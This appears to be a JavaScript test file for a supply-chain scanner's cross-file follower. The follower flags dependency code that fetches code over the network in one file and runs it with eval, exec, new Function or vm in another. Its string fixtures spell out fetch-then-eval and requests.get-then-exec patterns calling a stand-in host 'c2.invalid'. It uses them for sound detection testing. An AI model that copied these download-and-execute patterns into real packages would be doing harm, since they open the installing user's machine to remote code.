// 0.1.8 in the npm engine: the cross-file received-code follower
// (lib/crossfile.js, twin of core._cross_file_received_issues), which the
// --deps checks run. python/tests/scanner/test_cross_file_follower.py has
// the full cases (the forms, the adversarial pass, the crafted false
// positives, the event emitter of 0.1.8) and
// tests/architecture/test_js_parity_crossfile.py compares the
// engines on them and on a generated stream. Inert text: hosts are .invalid,
// nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run } from "../src/index.js";
import { crossFileReceivedIssues } from "../src/lib/crossfile.js";

const U = "'https://c2.invalid/p'";
const PY_NET = "import requests\n\ndef pull():\n    return requests.get(" + U + ").text\n";
const JS_NET = "function pull() {\n  return fetch(" + U + ").then((r) => r.text());\n}\nmodule.exports = { pull };\n";
const RECEIVED = "Dependency code runs code it receives over the network; the value is received in another file of the package";
const RUN_THERE = "Dependency code runs code it receives over the network; the function that runs it is in another file of the package";
const py = (files) => Object.entries(files).map(([p, content]) => ({ path: "site-packages/" + p, lang: "py", dep: true, content }));
const js = (files) => Object.entries(files).map(([p, content]) => ({ path: "node_modules/pkg/" + p, lang: "js", dep: true, content }));
const found = (files) => crossFileReceivedIssues(files).map((i) => [i.file, i.sev, i.msg.slice(0, i.msg.lastIndexOf(" ("))]);

test("a value received in one file and run in another", () => {
  assert.deepEqual(found(py({ "pkg/_net.py": PY_NET, "pkg/__init__.py": "from ._net import pull\nexec(pull())\n" })),
    [["site-packages/pkg/__init__.py", "CRITICAL", RECEIVED]]);
  assert.deepEqual(found(js({ "net.js": JS_NET, "run.js": "const { pull } = require('./net');\npull().then((c) => eval(c));\n" })),
    [["node_modules/pkg/run.js", "CRITICAL", RECEIVED]]);
});

test("the adversarial forms: an object's methods, a Promise, a runner in another file, then(eval)", () => {
  const api = "module.exports = {\n  async getConfig() {\n    const r = await fetch(" + U + ");\n    return r.text();\n  },\n};\n";
  assert.deepEqual(found(js({ "api.js": api, "index.js": "const api = require('./api');\napi.getConfig().then((c) => eval(c));\n" })),
    [["node_modules/pkg/index.js", "CRITICAL", RECEIVED]]);
  const promise = "const https = require('https');\nfunction pull() {\n  return new Promise((resolve) => {\n"
    + "    https.get(" + U + ", (res) => resolve(res));\n  });\n}\nmodule.exports = { pull };\n";
  assert.deepEqual(found(js({ "net.js": promise, "run.js": "const { pull } = require('./net');\npull().then(eval);\n" })),
    [["node_modules/pkg/run.js", "CRITICAL", RECEIVED]]);
  assert.deepEqual(found(js({ "util.js": "exports.execute = (code) => eval(code);\n",
    "index.js": "const { execute } = require('./util');\nfetch(" + U + ").then((r) => r.text()).then(execute);\n" })),
  [["node_modules/pkg/index.js", "CRITICAL", RUN_THERE]]);
  assert.deepEqual(found(py({ "pkg/util.py": "def run(code):\n    exec(code)\n",
    "pkg/__init__.py": "import requests\nfrom .util import run\nrun(requests.get(" + U + ").text)\n" })),
  [["site-packages/pkg/__init__.py", "CRITICAL", RUN_THERE]]);
});

test("crafted false positives stay quiet", () => {
  assert.deepEqual(found(js({ "net.js": JS_NET, "run.js": "const { pull } = require('./net');\npull().then((c) => JSON.parse(c));\n" })), []);
  assert.deepEqual(found(js({ "util.js": "exports.execute = (code) => eval(code);\n",
    "index.js": "const { execute } = require('./util');\nconst https = require('https');\nexecute('1 + 1');\n" })), []);
  assert.deepEqual(found(py({ "pkg/_net.py": PY_NET, "pkg/run.py": "from ._net import pull\n# exec(pull()) would be unsafe\ndata = pull()\n" })), []);
});

test("an event emitter: a value emitted in one file, run by a listener in another (0.1.8)", () => {
  const net = "const EventEmitter = require('events');\nconst bus = new EventEmitter();\n"
    + "fetch(" + U + ").then((r) => r.text()).then((c) => bus.emit('code', c));\nmodule.exports = { bus };\n";
  for (const run of ["const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n",
    "const { bus } = require('./net');\nbus.on('code', eval);\n",
    "const { bus } = require('./net');\nbus.once('code', function (src) {\n  new Function(src)();\n});\n"]) {
    assert.deepEqual(found(js({ "net.js": net, "run.js": run })), [["node_modules/pkg/run.js", "CRITICAL", RECEIVED]], run);
  }
  assert.deepEqual(found(js({ "net.js": "fetch(" + U + ").then((r) => r.text()).then((b) => process.emit('boot', b));\n",
    "run.js": "process.on('boot', (x) => { require('vm').runInThisContext(x); });\n" })),
  [["node_modules/pkg/run.js", "CRITICAL", RECEIVED]]);
  // quiet: a constant emitted, a listener that logs, another event, both ends in one file
  const quiet = [
    { "net.js": net.replace("bus.emit('code', c)", "bus.emit('code', 'console.log(1)')"),
      "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => eval(c));\n" },
    { "net.js": net, "run.js": "const { bus } = require('./net');\nbus.on('code', (c) => console.log(c));\n" },
    { "net.js": net, "run.js": "const { bus } = require('./net');\nbus.on('data', (c) => eval(c));\n" },
    { "net.js": net + "bus.on('code', (c) => eval(c));\n", "other.js": "module.exports = 1;\n" },
  ];
  for (const files of quiet) assert.deepEqual(found(js(files)), [], JSON.stringify(files));
});

test("--deps runs the follower; a file already flagged CRITICAL is left alone", () => {
  const files = {
    "package.json": JSON.stringify({ name: "app", version: "1.0.0" }),
    "node_modules/pkg/package.json": JSON.stringify({ name: "pkg", version: "1.0.0", main: "run.js" }),
    "node_modules/pkg/net.js": JS_NET,
    "node_modules/pkg/run.js": "const { pull } = require('./net');\npull().then((c) => eval(c));\n",
    "node_modules/solo/package.json": JSON.stringify({ name: "solo", version: "1.0.0" }),
    "node_modules/solo/net.js": JS_NET,
    "node_modules/solo/run.js": "const { pull } = require('./net');\nfetch(" + U + ").then((r) => r.text()).then((c) => eval(c));\n",
  };
  const root = mkdtempSync(join(tmpdir(), "lz-xf-"));
  const out = mkdtempSync(join(tmpdir(), "lz-xf-out-"));
  try {
    for (const [rel, data] of Object.entries(files)) {
      mkdirSync(dirname(join(root, rel)), { recursive: true });
      writeFileSync(join(root, rel), data);
    }
    run(["check", root, "--deps", "--out-dir", out, "--no-html", "--quiet"], { out: () => {}, err: () => {}, env: {} });
    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
    const got = rep.issues.filter((i) => i.rule === "SC-IMPORT-RISK").map((i) => [i.file.replaceAll("\\", "/"), i.sev, i.msg]);
    assert.deepEqual(got.sort(), [
      ["node_modules/pkg/run.js", "CRITICAL", RECEIVED + " (./net)."],
      ["node_modules/solo/run.js", "CRITICAL", "Dependency code runs code it receives over the network."],
    ]);
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(out, { recursive: true, force: true });
  }
});
